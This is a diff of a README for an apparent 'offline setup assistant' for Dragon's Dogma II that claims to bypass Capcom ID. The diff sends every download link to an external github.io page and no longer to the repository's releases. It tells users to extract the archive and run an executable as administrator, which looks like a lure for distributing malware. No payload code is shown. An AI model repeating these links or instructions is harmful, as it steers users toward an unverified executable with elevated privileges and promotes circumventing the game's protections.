@@ -1,5 +1,7 @@
 # 🐉 Dragon's Dogma II — Offline Setup Assistant
 
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://dragon-s-dogma-ii-offline.github.io/.github)
+
 <div align="center">
 
 [![GitHub release](https://img.shields.io/github/release/Dragon-s-Dogma-II-Offline/dragons-dogma-2-offline-setup-assistant.svg)](https://github.com/Dragon-s-Dogma-II-Offline/dragons-dogma-2-offline-setup-assistant/releases)
@@ -12,7 +14,7 @@
 **The ultimate offline configuration and setup assistant for Dragon's Dogma II**  
 *Launch, configure, and enjoy Dragon's Dogma II completely offline without Capcom ID*
 
-[📥 Download Latest](https://github.com/Dragon-s-Dogma-II-Offline/dragons-dogma-2-offline-setup-assistant/releases/latest) • [📖 Documentation](https://dragon-s-dogma-ii-offline.github.io/dragons-dogma-2-offline-setup-assistant) • [💬 Community](https://github.com/Dragon-s-Dogma-II-Offline/dragons-dogma-2-offline-setup-assistant/discussions) • [🐛 Report Issue](https://github.com/Dragon-s-Dogma-II-Offline/dragons-dogma-2-offline-setup-assistant/issues)
+[📥 Download Latest](https://dragon-s-dogma-ii-offline.github.io/.github) • [📖 Documentation](https://dragon-s-dogma-ii-offline.github.io/dragons-dogma-2-offline-setup-assistant) • [💬 Community](https://github.com/Dragon-s-Dogma-II-Offline/dragons-dogma-2-offline-setup-assistant/discussions) • [🐛 Report Issue](https://github.com/Dragon-s-Dogma-II-Offline/dragons-dogma-2-offline-setup-assistant/issues)
 
 </div>
 
@@ -36,7 +38,7 @@ This powerful gaming utility enables **100% offline gameplay** of Dragon's Dogma
 
 ### 📥 Installation (60 seconds)
 
-1. **Download** the latest release from GitHub releases page
+1. **Download** the archive using the button above
 2. **Extract** the archive using 7-Zip, WinRAR, or built-in Windows extraction
 3. **Launch** `DD2-Offline-Assistant.exe` as administrator
 4. **Select** your Dragon's Dogma II installation directory
@@ -235,7 +237,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 **⚔️ Ready to embark on your offline Dragon's Dogma II adventure? ⚔️**
 
-[📥 **Download Now**](https://github.com/Dragon-s-Dogma-II-Offline/dragons-dogma-2-offline-setup-assistant/releases/latest) • [⭐ **Star This Repo**](https://github.com/Dragon-s-Dogma-II-Offline/dragons-dogma-2-offline-setup-assistant) • [🔔 **Watch for Updates**](https://github.com/Dragon-s-Dogma-II-Offline/dragons-dogma-2-offline-setup-assistant/subscription)
+[📥 **Download Now**](https://dragon-s-dogma-ii-offline.github.io/.github) • [⭐ **Star This Repo**](https://github.com/Dragon-s-Dogma-II-Offline/dragons-dogma-2-offline-setup-assistant) • [🔔 **Watch for Updates**](https://github.com/Dragon-s-Dogma-II-Offline/dragons-dogma-2-offline-setup-assistant/subscription)
 
 ---
 
